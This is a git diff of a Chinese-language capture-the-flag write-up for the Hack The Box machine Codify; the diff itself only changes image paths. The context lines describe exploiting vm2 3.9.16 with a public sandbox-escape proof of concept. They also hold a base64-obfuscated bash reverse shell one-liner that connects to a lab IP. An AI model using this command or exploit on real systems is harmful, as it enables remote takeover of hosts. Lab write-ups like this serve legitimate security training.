@@ -18,7 +18,7 @@ tags:
 
 ### Attack Path Overview
 
-![attack-path](./AttackPath/HTB-Codify.png){ width='450' }
+![attack-path](./../attackpath/HTB-Codify.png){ width='450' }
 
 
 ## External Recon - nmap
@@ -54,7 +54,7 @@ PORT     STATE SERVICE VERSION
 根据vm2的版本号3.9.16，简单谷歌之后在github发现一个漏洞提交与PoC：<https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244>  
 复制其PoC代码粘贴到Editor运行后无反应，本身也不太懂Node.js，让ChatGPT解释了一下明白代码执行在 `execSync()` 处。遂将命令改为 `id` 后再次运行，成功显示结果：
 
-![HTB-Codify-PoC](./evidence-img/HTB-Codify-PoC.png)
+![HTB-Codify-PoC](./../evidence-img/HTB-Codify-PoC.png)
 
 接下来就简单了，使用反弹shell的命令：`echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC44LzQ0NDQgMD4mMQ==" |base64 -d|bash`
 
